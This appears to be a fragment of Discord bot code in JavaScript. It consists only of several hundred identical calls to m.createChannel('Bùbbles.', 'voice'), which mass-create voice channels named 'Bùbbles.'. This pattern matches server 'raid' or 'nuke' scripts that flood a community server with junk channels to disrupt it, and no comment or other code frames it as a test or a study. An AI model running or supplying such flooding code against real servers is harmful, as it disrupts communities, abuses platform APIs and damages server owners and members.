m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
